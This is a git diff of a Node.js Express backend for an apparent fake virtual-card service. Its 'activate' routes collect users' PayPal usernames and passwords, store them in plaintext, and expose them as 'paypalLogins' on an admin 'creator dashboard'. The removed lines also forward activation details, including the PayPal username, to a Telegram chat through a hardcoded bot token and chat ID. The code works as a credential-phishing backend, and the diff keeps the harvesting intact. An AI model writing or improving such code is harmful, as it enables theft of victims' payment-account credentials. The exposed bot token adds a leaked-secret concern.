@@ -6,49 +6,11 @@ const port = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// JWT Secret (should match frontend's expectation)
-const JWT_SECRET = 'your-secure-secret-key'; // Update this for production
-
-// Telegram configuration
-const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo'; // Verify this token
-const TELEGRAM_CHAT_ID_ADMIN = '6270110371'; // Verify this chat ID
-
-// Initialize or load data.json
-let cards = {};
-try {
-    cards = JSON.parse(fs.readFileSync('data.json', 'utf8'));
-    if (!cards.users || !cards.cards || !cards.logs) {
-        cards = { users: [], cards: [], logs: [] };
-        fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
-    }
-} catch (error) {
-    if (error.code === 'ENOENT') {
-        cards = { users: [], cards: [], logs: [] };
-        fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
-        console.log('Created data.json with initial structure.');
-    } else {
-        console.error('Error reading data.json:', error);
-        process.exit(1);
-    }
-}
-
-// Function to send Telegram notification
-async function sendTelegramNotification(message) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID_ADMIN) {
-        console.log('Telegram notification skipped: Missing token or chat ID');
-        return;
-    }
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
-        });
-        if (!response.ok) throw new Error('Telegram API failed');
-        console.log('Telegram notification sent:', message);
-    } catch (error) {
-        console.error('Telegram notification error:', error.message);
-    }
+// Data file initialization
+const dataFile = 'data.json';
+let data = { users: [], cards: [], logs: [] };
+if (fs.existsSync(dataFile)) {
+    data = JSON.parse(fs.readFileSync(dataFile));
 }
 
 // Middleware to verify token
@@ -57,121 +19,124 @@ const authenticateToken = (req, res, next) => {
     const token = authHeader && authHeader.split(' ')[1];
     if (!token) return res.status(401).json({ error: 'No token provided' });
 
-    jwt.verify(token, JWT_SECRET, (err, user) => {
-        if (err) return res.status(403).json({ error: 'Invalid or expired token' });
+    jwt.verify(token, 'your-secret-key', (err, user) => {
+        if (err) return res.status(403).json({ error: 'Invalid token' });
         req.user = user;
         next();
     });
 };
 
-const isCreator = (req, res, next) => {
-    if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied. Creator role required.' });
-    next();
-};
-
-// Signup route
+// Authentication routes
 app.post('/api/auth/signup', (req, res) => {
     const { username, password } = req.body;
     if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
-        return res.status(400).json({ error: 'Invalid username or password format' });
+        return res.status(400).json({ error: 'Invalid username or password' });
     }
-    if (cards.users.find(u => u.username === username)) {
+    if (data.users.find(u => u.username === username)) {
         return res.status(400).json({ error: 'Username already exists' });
     }
-    cards.users.push({ username, password });
-    fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
-    sendTelegramNotification(`New user signed up: ${username}`);
-    res.status(201).json({ message: 'User created successfully', token: jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' }) });
+    data.users.push({ username, password }); // In production, hash password
+    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+    res.status(201).json({ message: 'User created successfully' });
 });
 
-// Login route
 app.post('/api/auth/login', (req, res) => {
     const { username, password } = req.body;
-    const user = cards.users.find(u => u.username === username && u.password === password);
+    const user = data.users.find(u => u.username === username && u.password === password);
     if (!user) return res.status(401).json({ error: 'Invalid credentials' });
-    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
-    sendTelegramNotification(`User logged in: ${username}`);
+    const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
     res.json({ token });
 });
 
-// Generate card route
+// Card management routes
+app.get('/api/cards', authenticateToken, (req, res) => {
+    const userCards = data.cards.filter(c => c.user === req.user.username);
+    res.json(userCards);
+});
+
 app.post('/api/cards/generate', authenticateToken, (req, res) => {
     const { name, expDate, amount } = req.body;
     if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
-        return res.status(400).json({ error: 'Invalid card data' });
+        return res.status(400).json({ error: 'Invalid card details' });
     }
     const cardId = Date.now().toString();
-    const card = { cardId, name, expDate, amount, number: '****-****-****-' + Math.floor(1000 + Math.random() * 9000), cvv: Math.floor(100 + Math.random() * 900), timestamp: new Date().toISOString() };
-    cards.cards.push(card);
-    fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
-    sendTelegramNotification(`New card generated by ${req.user.username}: Card ID ${cardId}`);
+    const card = { cardId, name, expDate, amount, number: '4111-1111-1111-1111', cvv: '123', user: req.user.username, status: 'pending' };
+    data.cards.push(card);
+    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
     res.status(201).json({ cardId });
 });
 
-// Get all cards route
-app.get('/api/cards', authenticateToken, (req, res) => {
-    res.json(cards.cards);
-});
-
-// Delete card route
 app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
     const cardId = req.params.cardId;
-    const initialLength = cards.cards.length;
-    cards.cards = cards.cards.filter(card => card.cardId !== cardId);
-    if (cards.cards.length < initialLength) {
-        fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
-        sendTelegramNotification(`Card deleted by ${req.user.username}: Card ID ${cardId}`);
-        res.json({ message: 'Card deleted successfully' });
-    } else {
-        res.status(404).json({ error: 'Card not found' });
-    }
+    const cardIndex = data.cards.findIndex(c => c.cardId === cardId && c.user === req.user.username);
+    if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
+    data.cards.splice(cardIndex, 1);
+    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+    res.json({ message: 'Card deleted' });
 });
 
-// Activate card route (get)
 app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
     const cardId = req.params.cardId;
-    const card = cards.cards.find(c => c.cardId === cardId);
+    const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
     if (!card) return res.status(404).json({ error: 'Card not found' });
-    res.json({ cardId: card.cardId, status: card.status || 'pending', paypalUsername: card.paypalUsername, paypalPassword: card.paypalPassword });
+    res.json(card);
 });
 
-// Activate card route (post)
 app.post('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
     const cardId = req.params.cardId;
     const { username, password } = req.body;
-    if (!username || !password) return res.status(400).json({ error: 'PayPal credentials required' });
-    const card = cards.cards.find(c => c.cardId === cardId);
+    const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
     if (!card) return res.status(404).json({ error: 'Card not found' });
+    if (!username || !password) return res.status(400).json({ error: 'PayPal credentials required' });
+    card.status = 'activated';
     card.paypalUsername = username;
     card.paypalPassword = password;
-    card.status = 'activated';
-    const loginData = { cardId, paypalUsername: username, paypalPassword: password, user: req.user.username, timestamp: new Date().toISOString() };
-    cards.logs.push(loginData);
-    fs.writeFileSync('data.json', JSON.stringify(cards, null, 2));
-    sendTelegramNotification(`Card activated by ${req.user.username}: Card ID ${cardId}, PayPal: ${username}`);
-    res.json({ message: 'Card activated successfully', cardId, status: 'activated' });
+    data.logs.push({ user: req.user.username, time: Date.now() });
+    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+    res.json({ message: 'Card activated', cardId });
 });
 
-// Creator dashboard route
-app.get('/api/creator/dashboard', authenticateToken, isCreator, (req, res) => {
-    const generatedCards = cards.cards.map(card => ({
-        cardId: card.cardId,
-        name: card.name,
-        expDate: card.expDate,
-        amount: card.amount,
-        user: card.user || 'Unknown',
-        timestamp: card.timestamp || 'N/A'
-    }));
-    const paypalLogins = cards.logs.map(log => ({
-        cardId: log.cardId,
-        paypalUsername: log.paypalUsername,
-        paypalPassword: log.paypalPassword,
-        user: log.user,
-        timestamp: log.timestamp
-    }));
-    res.json({ generatedCards, paypalLogins });
+app.get('/api/cards/logs', authenticateToken, (req, res) => {
+    res.json(data.logs);
+});
+
+app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
+    if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
+    res.json({ generatedCards: data.cards, paypalLogins: data.cards.filter(c => c.paypalUsername) });
+});
+
+// Telegram notification (placeholder)
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'your-bot-token';
+const TELEGRAM_CHAT_ID_ADMIN = process.env.TELEGRAM_CHAT_ID_ADMIN || 'your-chat-id';
+async function sendTelegramNotification(message) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID_ADMIN) {
+        console.log('Telegram notification skipped: Missing token or chat ID');
+        return;
+    }
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
+        });
+        console.log('Telegram notification sent:', message);
+    } catch (error) {
+        console.error('Telegram notification error:', error);
+    }
+}
+
+// Error handling
+app.use((err, req, res, next) => {
+    console.error(err.stack);
+    res.status(500).json({ error: 'Something went wrong' });
 });
 
 app.listen(port, () => {
     console.log(`Server running on port ${port}`);
+});
+
+// Save data on process exit
+process.on('SIGTERM', () => {
+    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+    process.exit(0);
 });
